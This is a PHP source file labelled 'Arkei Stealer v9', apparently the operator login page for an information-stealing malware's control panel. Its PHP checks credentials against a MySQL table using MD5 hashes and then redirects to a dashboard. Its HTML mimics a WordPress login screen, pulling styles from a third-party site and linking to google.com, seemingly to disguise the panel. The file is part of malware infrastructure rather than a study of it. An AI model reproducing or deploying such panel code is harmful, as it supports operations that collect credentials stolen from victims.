<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [auth.php]
*    Auth
*/

session_start();

error_reporting(0);

require('../app/config.php');

$login = checkParam($_POST['login']);
$password = checkParam($_POST['password']);

if($_SESSION["auth"] == true)
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/dashboard.php', true, 301 );
	exit();
}

if ($login != null & $password != null)
{
	$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);
	
	$_login = mysqli_real_escape_string($database, $login);
	$_passw = mysqli_real_escape_string($database, $password);
	
	$passwordHash = md5($_passw);
	
	$checkUser = $database->query("SELECT * FROM `users` WHERE `login`='$_login' and `password`='$passwordHash'")->fetch_array();
	
	if($checkUser["id"] != null)
	{
		$_SESSION["auth"] = true;
		$_SESSION["user"] = $checkUser["login"];
		$_SESSION["profile"] = $checkUser["profile"];
		
		header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/dashboard.php', true, 301 );
		exit();
	}
}

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>
<!DOCTYPE html>
	<!--[if IE 8]>
		<html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="ru-RU">
	<![endif]-->
	<!--[if !(IE 8) ]><!-->
		<html xmlns="http://www.w3.org/1999/xhtml" lang="ru-RU">
	<!--<![endif]-->
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>Login &lsaquo; Codex Sample &#8212; WordPress</title>
	<link rel='dns-prefetch' href='//s.w.org' />
<link rel='stylesheet' href='https://lifehacker.ru/wp-admin/load-styles.php?c=1&amp;dir=ltr&amp;load%5B%5D=dashicons,buttons,forms,l10n,login&amp;ver=4.9.8' type='text/css' media='all' />
<meta name='robots' content='noindex,follow' />
	<meta name="viewport" content="width=device-width" />
</head>
	<body class="login login-action-login wp-core-ui  locale-ru-ru">
		<div id="login">
		
		<h1><a href="https://wordpress.org/" title="WordPress" tabindex="-1">WordPress</a></h1>
	
<form name="loginform" id="loginform" action="" method="post">
	<p>
		<label for="user_login">Username<br />
		<input type="text" name="login" id="user_login" class="input" value="" size="20" /></label>
	</p>
	<p>
		<label for="user_pass">Password<br />
		<input type="password" name="password" id="user_pass" class="input" value="" size="20" /></label>
	</p>
		<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> Remember Me</label></p>
	<p class="submit">
		<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
	</p>
</form>

<p id="nav">
	<a href="https://google.com/">Lost your password?</a>
</p>

<script type="text/javascript">
function wp_attempt_focus(){
setTimeout( function(){ try{
d = document.getElementById('user_login');
d.focus();
d.select();
} catch(e){}
}, 200);
}

wp_attempt_focus();
if(typeof wpOnload=='function')wpOnload();
</script>

	<p id="backtoblog"><a href="https://google.com/">&larr; Back to &laquo;Codex Sample&raquo;</a></p>
		
	</div>

	
		<div class="clear"></div>
	</body>
	</html>